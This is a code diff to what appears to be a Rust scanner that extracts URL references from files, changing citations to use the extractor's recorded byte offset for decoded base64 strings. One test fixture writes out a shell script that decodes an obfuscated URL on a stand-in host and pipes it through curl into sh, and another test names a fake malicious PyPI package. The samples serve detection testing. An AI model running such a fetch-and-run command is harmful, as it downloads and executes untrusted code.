@@ -65,13 +65,18 @@ pub fn references_from_facts(values: &serde_json::Value, declared: &[Reference])
 /// value is itself the on-disk evidence the citation points at.
 fn extracted_refs(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
     for s in parsed.text().iter() {
+        // The extractor already recorded where the run sits, so cite that
+        // rather than searching the file for the value. It is also the only
+        // correct answer for a *decoded* string (base64, XOR): that text never
+        // appears in the raw bytes, so a search would place it at offset 0
+        // while `data_offset` points at the encoded run it came from.
         for url in extract_urls(&s.value) {
-            let evidence = s.value.clone();
-            out.push(
+            out.push_at(
                 RefLocator::Url(url.to_string()),
                 RefKind::UrlFetch,
                 "string",
-                evidence,
+                s.value.clone(),
+                s.data_offset,
             );
         }
     }
@@ -209,7 +214,9 @@ struct Found<'a> {
 
 impl Found<'_> {
     /// Push an imperative reference (no pin), deriving its offset from the first
-    /// occurrence of `evidence`, else the package-name/URL, else `0`.
+    /// occurrence of `evidence`, else the package-name/URL, else `0`. For a
+    /// recognizer that already knows where it looked, use [`Self::push_at`] —
+    /// searching for an offset already in hand is both slower and less accurate.
     fn push(
         &mut self,
         locator: RefLocator,
@@ -225,6 +232,18 @@ impl Found<'_> {
                     .or_else(|| t.find(&anchor_from_locator(&locator)))
             })
             .unwrap_or(0) as u64;
+        self.push_at(locator, kind, source, evidence, offset);
+    }
+
+    /// Push an imperative reference whose byte offset the caller already knows.
+    fn push_at(
+        &mut self,
+        locator: RefLocator,
+        kind: RefKind,
+        source: impl Into<String>,
+        evidence: String,
+        offset: u64,
+    ) {
         self.refs.push(Reference {
             locator,
             kind,
@@ -1536,16 +1555,24 @@ mod tests {
         let script =
             b"#!/bin/sh\nu=$(echo aHR0cHM6Ly9ldmlsLnRlc3QveC5zaA== | base64 -d)\ncurl -fsSL \"$u\" | sh\n";
         let refs = references_in_bytes(script, "stage.sh");
-        let urls: Vec<_> = refs
+        let decoded: Vec<_> = refs
             .iter()
-            .filter_map(|r| match &r.locator {
-                RefLocator::Url(u) => Some(u.as_str()),
-                RefLocator::Purl(_) | RefLocator::Path(_) => None,
-            })
+            .filter(|r| matches!(&r.locator, RefLocator::Url(u) if u == "https://evil.test/x.sh"))
             .collect();
         assert!(
-            urls.contains(&"https://evil.test/x.sh"),
+            !decoded.is_empty(),
             "decoded base64 url should be recovered; got {refs:?}"
+        );
+        // The citation must point at the base64 token the URL was decoded from.
+        // The decoded text appears nowhere in the file, so searching for it can
+        // only ever answer 0 — the extractor's recorded offset is the real one.
+        let b64_at = script
+            .windows(4)
+            .position(|w| w == b"aHR0")
+            .expect("base64 token in the fixture") as u64;
+        assert!(
+            decoded.iter().any(|r| r.offset == b64_at),
+            "expected a citation at the base64 token (offset {b64_at}); got {decoded:?}"
         );
     }
 
@@ -1900,7 +1927,10 @@ mod tests {
             offset: None,
         }];
         let py = purls_of(&import_calls("python", &py_symbols));
-        assert!(py.contains(&"pkg:pypi/evil_telemetry".to_string()), "{py:?}");
+        assert!(
+            py.contains(&"pkg:pypi/evil_telemetry".to_string()),
+            "{py:?}"
+        );
     }
 
     #[test]
